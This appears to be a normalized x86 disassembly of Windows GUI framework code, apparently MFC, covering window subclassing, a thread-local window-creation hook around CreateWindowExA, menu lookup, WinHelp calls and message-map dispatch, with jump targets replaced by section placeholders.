test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x1c
push r--data
call sub_10013db4
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x14 ] eax
call sub_1001461c
pop ebx
sub_100153b4
push esi
push edi
push 0x1
call sub_10015342
mov esi eax
push [ esp + 0xc ]
mov ecx esi
call sub_10013e19
mov edi eax
push esi
mov ecx edi
call sub_10017530
mov eax edi
pop edi
pop esi
retn 0x4
sub_100153f9
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
push edi
push 0x1
call sub_10015342
mov edi eax
push ebx
mov [ esi + 0x1c ] ebx
lea ecx [ edi + 0x4 ]
call sub_10013453
push edi
mov ecx esi
mov [ eax ] esi
call sub_10017530
push 0x1
pop eax
pop edi
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn 0x4
sub_10015432
push esi
mov esi ecx
push edi
mov edi [ esi + 0x1c ]
test edi edi
je r-xdata
and [ esi + 0x38 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_10015342
test eax eax
je r-xdata
and [ esi + 0x1c ] 0x0
push [ esi + 0x1c ]
lea ecx [ eax + 0x4 ]
call sub_100134a3
sub_10015461
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x360
jne r-xdata
push [ ebp + 0x8 ]
call sub_100153db
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_100151f3
push 0x1
pop eax
jmp r-xdata
pop ebp
retn 0x10
sub_10015496
mov eax sub_10019b34
call sub_10004904
sub esp 0x40
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi r--data
mov [ ebp - 0x10 ] esp
push esi
push edi
call [ GetPropA@IAT ]
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
push 0x1
sub eax 0x6
pop ebx
je r-xdata
push [ ebp + 0x14 ]
call sub_100153b4
push edi
mov esi eax
call sub_100153b4
push esi
push [ ebp + 0x10 ]
push eax
call sub_1001511c
sub eax 0x1a
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcA@IAT ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
push edi
call sub_100153b4
mov ecx [ ebp + 0x14 ]
shr ecx 0x10
push ecx
movsx ecx [ ebp + 0x14 ]
push ecx
push eax
call sub_1001517d
xor ebx ebx
test eax eax
sete bl
jmp r-xdata
sub eax 0x62
je r-xdata
test ebx ebx
je r-xdata
push [ ebp - 0x18 ]
push 0xfffffffc
push edi
call [ SetWindowLongA@IAT ]
push esi
push edi
call [ RemovePropA@IAT ]
push esi
call [ GlobalFindAtomA@IAT ]
push eax
call [ GlobalDeleteAtom@IAT ]
jmp r-xdata
sub eax 0x8e
jne r-xdata
push edi
call sub_100153b4
mov esi eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_10015080
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x110
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcA@IAT ]
push [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_100150a3
sub_100155b9
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x40 ] eax
call sub_10013b81
mov edx [ eax ]
lea ecx [ ebp - 0x4c ]
push ecx
mov ecx eax
push [ ebp - 0x20 ]
call [ edx + 0x6c ]
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
call sub_10014678
mov eax r-xdata
retn
sub_100155f5
push ebp
mov ebp esp
push esi
push edi
push sub_100192e4
mov ecx rw-data
call sub_10018975
mov edi [ ebp + 0xc ]
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_10015496
cmp edi 0x135
je r-xdata
push [ esi + 0x8 ]
push eax
lea eax [ edi - 0x132 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_10016e5d
test eax eax
je r-xdata
cmp edi 0x136
je r-xdata
mov eax [ esi + 0x4 ]
jmp r-xdata
cmp edi 0x138
je r-xdata
pop edi
pop esi
pop ebp
retn 0x10
cmp edi 0x137
je r-xdata
cmp edi 0x134
jne r-xdata
sub_10015671
push ebp
mov ebp esp
sub esp 0x10
push sub_10018322
mov ecx rw-data
call sub_100188b3
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ eax + 0x14 ]
push edi
mov edi [ ecx ]
call sub_10018d2c
movzx eax [ eax + 0x14 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
test esi esi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ eax + 0x2c ]
call [ CallNextHookEx@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
test [ edi + 0x23 ] 0x40
jne r-xdata
leave
retn 0xc
test esi esi
je r-xdata
push 0xffffffe6
push ebx
call [ GetClassLongA@IAT ]
test eax 0x10000
jne r-xdata
mov esi [ ebp - 0x4 ]
test eax eax
jne r-xdata
push 0xfffffffc
push ebx
call [ GetWindowLongA@IAT ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
push ebx
mov ecx esi
call sub_100153f9
mov eax [ esi ]
mov ecx esi
call [ eax + 0x50 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x80 ]
cmp [ rw-data ] 0x0
mov [ ebp + 0xc ] eax
jne r-xdata
mov eax [ edi + 0x28 ]
mov ecx eax
shr ecx 0x10
test cx cx
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
push [ esi + 0x2c ]
call [ UnhookWindowsHookEx@IAT ]
and [ esi + 0x2c ] 0x0
mov edi [ GetPropA@IAT ]
mov esi r--data
push esi
push ebx
call edi
test eax eax
jne r-xdata
call sub_10015490
mov esi eax
push esi
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
cmp eax esi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push r--data
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
and [ ebp - 0x10 ] cl
lea eax [ ebp - 0x10 ]
push 0x5
push eax
mov ax [ edi + 0x28 ]
push eax
call [ GlobalGetAtomNameA@IAT ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x8 ]
push esi
push ebx
call [ SetPropA@IAT ]
push esi
push ebx
call edi
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
and [ esi + 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov edi [ rw-data ]
test edi edi
je r-xdata
push esi
call [ GlobalAddAtomA@IAT ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
mov eax sub_100155f5
jne r-xdata
push [ ebp + 0x10 ]
push ebx
push 0x3
push [ esi + 0x2c ]
call [ CallNextHookEx@IAT ]
cmp [ ebp - 0x8 ] 0x0
mov edi eax
je r-xdata
cmp [ edi + 0x20 ] 0x0
je r-xdata
push eax
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
mov eax sub_10015496
push 0x0
push 0x0
push 0x36f
push ebx
push esi
call sub_100151f3
test eax eax
mov [ ebp - 0x10 ] eax
je r-xdata
call sub_10015490
push 0xfffffffc
push ebx
mov [ ebp + 0x8 ] eax
call [ GetWindowLongA@IAT ]
push [ ebp - 0x10 ]
mov esi eax
sub esi [ ebp + 0x8 ]
push ebx
neg esi
sbb esi esi
inc esi
call [ edi + 0x20 ]
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
jmp r-xdata
sub_10015867
push esi
push edi
push sub_10018322
mov ecx rw-data
call sub_100188b3
mov esi eax
mov edi [ esp + 0xc ]
cmp [ esi + 0x14 ] edi
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x2c ] 0x0
jne r-xdata
mov [ esi + 0x14 ] edi
call [ GetCurrentThreadId@IAT ]
push eax
push 0x0
push sub_10015671
push 0x5
call [ SetWindowsHookExA@IAT ]
test eax eax
mov [ esi + 0x2c ] eax
jne r-xdata
call sub_1001311c
sub_100158b3
push esi
push sub_10018322
mov ecx rw-data
call sub_100188b3
mov esi eax
call sub_10018d2c
cmp [ eax + 0x14 ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push 0x1
pop eax
pop esi
retn
and [ esi + 0x14 ] 0x0
xor eax eax
pop esi
retn
push eax
call [ UnhookWindowsHookEx@IAT ]
and [ esi + 0x2c ] 0x0
sub_100158f5
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x2c ]
mov esi ecx
mov [ ebp - 0x28 ] eax
call sub_10018d2c
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x30 ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x5c ]
test eax eax
jne r-xdata
push edi
push esi
call sub_10015867
push [ ebp - 0x30 ]
push [ ebp - 0x2c ]
push [ ebp - 0x28 ]
push [ ebp - 0x24 ]
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call [ CreateWindowExA@IAT ]
mov edi eax
call sub_100158b3
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
xor eax eax
jmp r-xdata
xor eax eax
test edi edi
setne al
pop edi
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
pop esi
leave
retn 0x2c
sub_100159db
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
test eax eax
push edi
jne r-xdata
mov edi [ eax + 0x1c ]
xor edi edi
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ ebp + 0x14 ]
push [ ebp + 0x1c ]
mov edx [ eax + 0x4 ]
mov esi [ eax ]
push edi
mov edi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub edi edx
sub eax esi
push edi
push eax
mov eax [ ebp + 0x10 ]
push edx
or eax 0x40000000
push esi
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
call sub_100158f5
pop edi
pop esi
pop ebp
retn 0x1c
sub_10015a27
mov eax sub_10019b48
call sub_10004904
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp esi rw-data
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_10014aa3
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ eax + 0x24 ] esi
jne r-xdata
cmp esi rw-data
je r-xdata
and [ eax + 0x24 ] 0x0
cmp esi rw-data
je r-xdata
call sub_10015be4
sub_10015aa3
push esi
mov esi ecx
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
and [ esi + 0x34 ] 0x0
mov ecx esi
call sub_1001531b
pop esi
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_10015ac1
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
mov esi ecx
call sub_10013b81
mov edi eax
xor ebx ebx
cmp edi ebx
je r-xdata
mov ecx [ esi + 0x30 ]
cmp ecx ebx
je r-xdata
cmp [ edi + 0x1c ] esi
jne r-xdata
mov ecx [ esi + 0x34 ]
push 0x1
test ecx ecx
pop ebx
je r-xdata
mov eax [ ecx ]
call [ eax + 0x50 ]
mov [ esi + 0x30 ] ebx
cmp [ edi + 0x20 ] esi
jne r-xdata
call sub_10018d2c
cmp [ eax + 0x14 ] bl
jne r-xdata
and [ esi + 0x34 ] 0x0
test [ esi + 0x24 ] bl
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
mov [ edi + 0x20 ] ebx
mov [ edi + 0x1c ] ebx
call sub_10018d2c
cmp edi [ eax + 0x4 ]
jne r-xdata
mov edi [ GetWindowLongA@IAT ]
push 0xfffffffc
push [ esi + 0x1c ]
call edi
mov ecx esi
mov ebx eax
call sub_1001531b
push 0xfffffffc
push [ esi + 0x1c ]
call edi
cmp eax ebx
jne r-xdata
call sub_10018afa
mov edi [ eax + 0xcc ]
test edi edi
je r-xdata
push ebx
call sub_10019908
call sub_1001830c
test eax eax
je r-xdata
mov ecx esi
call sub_10015432
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x80 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
push eax
push 0xfffffffc
push [ esi + 0x1c ]
call [ SetWindowLongA@IAT ]
push 0x2c
lea eax [ ebp - 0x2c ]
push 0x0
push eax
call sub_10004940
mov eax [ esi + 0x1c ]
add esp 0xc
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x2c ] 0x28
push eax
push 0x0
push 0x405
mov [ ebp - 0x28 ] ebx
push [ edi + 0x1c ]
call [ SendMessageA@IAT ]
sub_10015be4
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
jne r-xdata
push ebx
push edi
push 0x0
call sub_10015342
push [ esi + 0x1c ]
lea ecx [ eax + 0x4 ]
call sub_10013420
mov ecx [ esi + 0x38 ]
mov edi eax
test ecx ecx
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ ecx ]
call [ eax + 0x50 ]
push [ esi + 0x1c ]
call [ DestroyWindow@IAT ]
jmp r-xdata
mov eax ebx
pop edi
pop ebx
pop esi
retn
mov ecx esi
call sub_10015432
test edi edi
mov ebx eax
jne r-xdata
sub_10015c31
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x28 ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
push eax
call [ CallWindowProcA@IAT ]
mov eax [ esi ]
call [ eax + 0x80 ]
mov eax [ eax ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
call [ DefWindowProcA@IAT ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_10015c9b
push esi
call sub_10018afa
mov esi eax
mov eax [ esi + 0xcc ]
test eax eax
je r-xdata
cmp [ esp + 0x8 ] 0x0
mov esi [ esi + 0x108 ]
je r-xdata
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
pop esi
retn 0x4
test esi esi
je r-xdata
push 0x0
push 0x0
push 0x401
push eax
call [ SendMessageA@IAT ]
push 0x1
call [ GetKeyState@IAT ]
test ax ax
jl r-xdata
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0xdc ]
sub_10015cf2
push ebp
mov ebp esp
push ebx
push edi
push [ ebp + 0xc ]
mov ebx ecx
push [ ebp + 0x8 ]
push [ ebx + 0x1c ]
call sub_10017890
mov edi eax
test edi edi
je r-xdata
or eax 0xffffffff
push esi
push edi
call [ GetDlgCtrlID@IAT ]
mov esi [ ebp + 0x10 ]
movzx eax ax
test esi esi
mov [ ebp + 0xc ] eax
je r-xdata
mov eax [ ebp + 0xc ]
pop esi
jmp r-xdata
cmp [ esi ] 0x28
jb r-xdata
pop edi
pop ebx
pop ebp
retn 0xc
mov eax [ ebx + 0x1c ]
or [ esi + 0x4 ] 0x1
or [ esi + 0x24 ] 0xffffffff
push 0x0
push 0x0
push 0x87
push edi
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edi
call [ SendMessageA@IAT ]
test ah 0x20
jne r-xdata
or [ esi + 0x4 ] 0x80000002
sub_10015d63
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
cmp [ esi ] 0x1
jne r-xdata
push 0x0
push [ esi + 0x14 ]
call sub_100169a3
test eax eax
jne r-xdata
push [ esi + 0x14 ]
call sub_100177e8
test eax eax
je r-xdata
pop edi
pop esi
retn 0x8
mov ecx edi
call sub_1001531b
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0xc ]
jmp r-xdata
sub_10015da0
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0xc ]
mov esi ecx
push [ eax + 0x8 ]
call sub_100169a3
test eax eax
je r-xdata
mov ecx esi
call sub_1001531b
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_10015dea
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_1001531b
lea eax [ ebp + 0xc ]
push eax
call sub_10016976
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_10015e15
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
push [ esi + 0x4 ]
call [ GetMenuItemCount@IAT ]
mov ebx eax
xor edi edi
test ebx ebx
jle r-xdata
xor eax eax
push edi
push [ esi + 0x4 ]
call [ GetSubMenu@IAT ]
push eax
call sub_100177d3
test eax eax
je r-xdata
push edi
push [ esi + 0x4 ]
call [ GetMenuItemID@IAT ]
cmp eax [ esp + 0x14 ]
je r-xdata
push [ esp + 0x14 ]
push eax
call sub_10015e15
test eax eax
jne r-xdata
push [ esi + 0x4 ]
call sub_100177e8
jmp r-xdata
inc edi
cmp edi ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn 0x8
jmp r-xdata
sub_10015e78
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
cmp [ esi ] 0x1
jne r-xdata
mov esi [ esi + 0x4 ]
push 0x1
push esi
push [ edi + 0x1c ]
call sub_10016855
test eax eax
je r-xdata
push sub_10018322
mov ecx rw-data
call sub_100188b3
mov ecx [ edi + 0x1c ]
cmp [ eax + 0x50 ] ecx
jne r-xdata
mov ecx edi
call sub_1001531b
push 0x0
mov ecx eax
call sub_10016976
test eax eax
jne r-xdata
push ecx
call [ GetMenu@IAT ]
push eax
push [ eax + 0x54 ]
jmp r-xdata
pop edi
pop esi
retn 0x8
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0x10 ]
jmp r-xdata
call sub_100177d3
push [ esi + 0x8 ]
push eax
call sub_10015e15
test eax eax
je r-xdata
sub_10015ef0
mov eax sub_10019b54
call sub_10004904
sub esp 0x30
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x10 ] esp
push eax
push [ esi + 0x24 ]
push [ esi + 0x10 ]
call [ GetClassInfoA@IAT ]
test eax eax
jne r-xdata
push 0x1
pop eax
push esi
call [ RegisterClassA@IAT ]
test ax ax
jne r-xdata
call sub_10018d2c
xor ebx ebx
cmp [ eax + 0x14 ] bl
je r-xdata
xor eax eax
jmp r-xdata
push 0x1
call sub_1001901a
mov [ ebp - 0x4 ] ebx
call sub_10018d2c
push [ esi + 0x24 ]
mov esi [ lstrcatA@IAT ]
lea edi [ eax + 0x34 ]
push edi
call esi
lea eax [ ebp + 0xa ]
mov [ ebp + 0xa ] 0xa
push eax
push edi
mov [ ebp + 0xb ] bl
call esi
or [ ebp - 0x4 ] 0xffffffff
push 0x1
call sub_1001908a
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_10015f81
push 0x1
call sub_1001908a
xor ebx ebx
push ebx
push ebx
call sub_10004998
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
push sub_10018322
mov ecx rw-data
mov [ ebp - 0xc ] eax
call sub_100188b3
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0xc ]
sub eax 0x132
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
push 0x0
push 0x19
mov ecx esi
call [ eax + 0x98 ]
pop esi
leave
retn 0x8
sub_10015fd7
mov eax sub_10019b68
call sub_10004904
push ecx
push ebx
push esi
mov esi ecx
call sub_10018d2c
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
call sub_10018d2c
mov ecx [ eax + 0x4 ]
call sub_10014cf2
mov eax [ esi ]
xor ebx ebx
mov ecx esi
mov [ ebp - 0x4 ] ebx
call [ eax + 0xb0 ]
test eax eax
je r-xdata
push edi
mov edi [ SendMessageA@IAT ]
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call edi
push 0x1
push 0x1
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call sub_100168ce
mov ecx esi
call sub_1001682d
push ebx
mov esi eax
push ebx
push 0x1f
push [ esi + 0x1c ]
call edi
push 0x1
push 0x1
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call sub_100168ce
call [ GetCapture@IAT ]
cmp eax ebx
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xf0 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x8c ]
push [ esi + 0x1c ]
call [ WinHelpA@IAT ]
test eax eax
pop edi
jne r-xdata
push ebx
push ebx
push 0x1f
push eax
call edi
or [ ebp - 0x4 ] 0xffffffff
call sub_10018d2c
mov ecx [ eax + 0x4 ]
call sub_10014d07
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push 0xffffffff
push ebx
push 0xf107
call sub_100180bb
sub_100160bf
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
xor eax eax
mov [ ebp + 0x8 ] eax
cmp eax [ ebx ]
je r-xdata
cmp edx [ ebx + 0x4 ]
jne r-xdata
add ebx 0x18
jmp r-xdata
cmp ecx [ ebx + 0x8 ]
jb r-xdata
cmp [ ebx + 0x10 ] 0x0
je r-xdata
cmp ecx [ ebx + 0xc ]
ja r-xdata
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ebx
pop ebp
retn 0x10
sub_100160ff
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
push ecx
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x9c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop esi
leave
retn 0xc
push [ ebp + 0x10 ]
mov eax [ esi ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0xa0 ]
mov [ ebp - 0x4 ] eax
sub_10016143
mov eax sub_10019b8c
call sub_10004904
sub esp 0x54
and [ ebp - 0x10 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
cmp ebx 0x111
mov edi ecx
jne r-xdata
cmp ebx 0x4e
jne r-xdata
push [ ebp + 0x10 ]
mov eax [ edi ]
push [ ebp + 0xc ]
call [ eax + 0x78 ]
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
cmp ebx 0x6
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp ebx 0x20
jne r-xdata
push esi
call sub_100153b4
push eax
push [ ebp + 0xc ]
push edi
call sub_1001511c
mov edx [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
push [ ebp + 0xc ]
mov ecx edi
call [ edx + 0x7c ]
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov ebx eax
mov eax 0x1ff
and ebx eax
and ecx eax
push 0x7
xor ebx ecx
call sub_1001901a
mov ecx [ ebp + 0x8 ]
lea eax [ ebx + ebx * 2 ]
cmp ecx [ eax * 4 + rw-data ]
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x14 ]
jne r-xdata
mov eax esi
shr eax 0x10
push eax
movsx eax si
push eax
push edi
call sub_1001517d
test eax eax
jne r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
jmp r-xdata
test eax eax
mov [ ebx ] ecx
mov [ ebx + 0x8 ] eax
je r-xdata
cmp eax [ ebx + 0x8 ]
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
and [ ebx + 0x4 ] 0x0
push 0x7
call sub_1001908a
jmp r-xdata
mov ebx [ ebx + 0x4 ]
push 0x7
mov [ ebp + 0x10 ] ebx
call sub_1001908a
test ebx ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
mov edx 0xc000
cmp ecx edx
jae r-xdata
cmp [ ebp + 0x8 ] 0xc000
jb r-xdata
mov eax [ eax + 0x4 ]
push 0x0
push 0x0
push edx
push eax
call sub_100160bf
test eax eax
mov [ ebp + 0x10 ] eax
je r-xdata
push 0x0
push 0x0
push ecx
push [ eax + 0x4 ]
call sub_100160bf
test eax eax
mov [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov ebx [ ebx + 0x14 ]
cmp [ ecx + 0x8 ] 0x1a
mov eax [ ecx + 0x10 ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x14 ] eax
jne r-xdata
jmp r-xdata
push 0x7
mov [ ebx + 0x4 ] eax
call sub_1001908a
mov ebx [ ebp + 0x10 ]
jmp r-xdata
dec eax
cmp eax 0x30
ja r-xdata
call [ GetVersion@IAT ]
mov ecx [ ebp + 0x10 ]
cmp al 0x4
sbb eax eax
and al 0xf0
add eax 0x2f
mov ebx [ ebx + 0x14 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
cmp [ ecx ] edx
je r-xdata
jmp [ eax * 4 + jump_table_100165f1 ]
push 0x7
mov [ ebx + 0x4 ] eax
call sub_1001908a
mov ebx [ ebp + 0x10 ]
push 0x0
push 0x0
add eax 0x18
push 0xc000
push eax
call sub_100160bf
test eax eax
mov [ ebp + 0x10 ] eax
jne r-xdata
push [ ebp + 0xc ]
call sub_10017aa0
push eax
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movsx eax si
push eax
push [ ebp + 0xc ]
call sub_100153b4
jmp r-xdata
push esi
push [ ebp + 0xc ]
call sub_100153b4
jmp r-xdata
lea ecx [ ebp - 0x24 ]
call sub_100179fe
mov eax [ esi + 0x4 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x20 ] eax
call sub_10015016
mov eax [ esi ]
mov esi [ esi + 0x8 ]
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x44 ] eax
call sub_100153db
test eax eax
jne r-xdata
lea ecx [ ebp - 0x24 ]
call sub_100179fe
mov eax [ esi + 0x4 ]
push [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call ebx
and [ ebp - 0x20 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x24 ]
